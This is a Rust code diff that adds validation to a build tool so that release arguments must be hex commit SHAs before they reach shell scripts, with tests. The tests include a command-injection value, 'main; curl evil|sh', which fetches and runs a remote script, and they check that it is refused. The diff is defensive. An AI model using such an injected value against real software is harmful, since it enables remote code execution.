@@ -63,6 +63,9 @@ pub enum BuildError {
     #[error("release {release} is not in the daemon as {image_ref}")]
     Missing { release: String, image_ref: String },
 
+    #[error("invalid release {0:?}: must be a commit SHA (hex, 4-64 chars)")]
+    InvalidRelease(String),
+
     #[error("could not run a build step: {0}")]
     Exec(#[from] crate::exec::ExecError),
 
@@ -86,6 +89,18 @@ pub fn is_local(host: &str) -> bool {
     host.trim().is_empty() || host.trim() == "local"
 }
 
+/// Refuses a release that is not a hex commit name.
+///
+/// The value reaches a shell script (`git checkout <release>`) and an image
+/// tag, so a branch name or a shell fragment must never get through.
+fn check_release(release: &str) -> Result<(), BuildError> {
+    if crate::registry::is_valid_release_arg(release) {
+        Ok(())
+    } else {
+        Err(BuildError::InvalidRelease(release.to_string()))
+    }
+}
+
 /// Dockerfile path for an app: `<repo>/Dockerfile` unless told otherwise.
 pub fn dockerfile_for(app: &App) -> Option<PathBuf> {
     app.repo.as_ref().map(|repo| repo.join("Dockerfile"))
@@ -102,6 +117,7 @@ pub fn build_local(
     release: &str,
     work_parent: &Path,
 ) -> Result<Built, BuildError> {
+    check_release(release)?;
     let repo_url = remote_url(app)?;
     let image_ref = app
         .image_ref(release)
@@ -202,6 +218,7 @@ pub fn remote_build_script(repo_url: &str, release: &str, image_ref: &str, push:
 
 /// Builds `release` of `app` on `host` over SSH.
 pub fn build_ssh(run: &mut Run, app: &App, release: &str, host: &str) -> Result<Built, BuildError> {
+    check_release(release)?;
     let repo_url = remote_url(app)?;
     let image_ref = app
         .image_ref(release)
@@ -227,6 +244,7 @@ pub fn build_ssh(run: &mut Run, app: &App, release: &str, host: &str) -> Result<
 
 /// Verifies the release image is present without building anything.
 pub fn build_none(run: &mut Run, app: &App, release: &str) -> Result<Built, BuildError> {
+    check_release(release)?;
     let image_ref = app
         .image_ref(release)
         .ok_or_else(|| BuildError::NoRepo(app.name.clone()))?;
@@ -360,5 +378,44 @@ mod tests {
         let mut none = sample();
         none.repo = None;
         assert_eq!(dockerfile_for(&none), None);
+    }
+
+    #[test]
+    fn a_release_that_is_not_a_commit_is_refused() {
+        for bad in ["main", "main; curl evil|sh", "abc", "9c1f2ab "] {
+            assert!(
+                matches!(check_release(bad), Err(BuildError::InvalidRelease(_))),
+                "{bad:?} must be refused"
+            );
+        }
+        assert!(check_release("9c1f2ab").is_ok());
+        assert!(check_release("abcd").is_ok());
+    }
+
+    #[test]
+    fn build_none_refuses_before_reaching_the_chokepoint() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let log = crate::trace::TraceLog::open(dir.path().join("t.jsonl")).unwrap();
+        let mut run = crate::trace::Run::start(
+            log,
+            crate::trace::RunMode::Live,
+            None,
+            &["swapdock".to_string()],
+            crate::redact::Redactor::new(),
+        )
+        .unwrap();
+        let err = build_none(&mut run, &sample(), "main; curl evil|sh").unwrap_err();
+        assert!(matches!(err, BuildError::InvalidRelease(_)), "{err:?}");
+        run.finish(crate::trace::RunStatus::Ok).unwrap();
+
+        // Validation ran before the chokepoint: no step was recorded.
+        let read = crate::trace::TraceLog::read(dir.path().join("t.jsonl")).unwrap();
+        assert!(
+            !read
+                .events
+                .iter()
+                .any(|e| matches!(e, crate::trace::TraceEvent::Step { .. })),
+            "no command may run for an invalid release"
+        );
     }
 }
